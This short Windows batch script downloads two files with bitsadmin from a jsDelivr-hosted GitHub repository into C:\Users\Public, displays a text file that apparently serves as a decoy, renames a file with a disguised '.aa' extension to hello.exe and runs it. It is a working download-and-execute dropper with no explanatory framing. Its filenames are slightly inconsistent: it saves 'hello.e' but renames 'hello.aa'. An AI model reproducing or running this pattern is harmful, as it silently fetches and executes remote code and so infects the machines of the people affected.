color C & bitsadmin /transfer n https://cdn.jsdelivr.net/gh/ydecl/usb@main/adobe.txt C:\Users\Public\adobe.txt
color E & bitsadmin /transfer n https://cdn.jsdelivr.net/gh/ydecl/usb@main/hello.aa C:\Users\Public\hello.e

chcp 65001 
color 2 & type C:\Users\Public\adobe.txt

cd C:\Users\Public && rename hello.aa hello.exe &&start C:\Users\Public\hello.exe
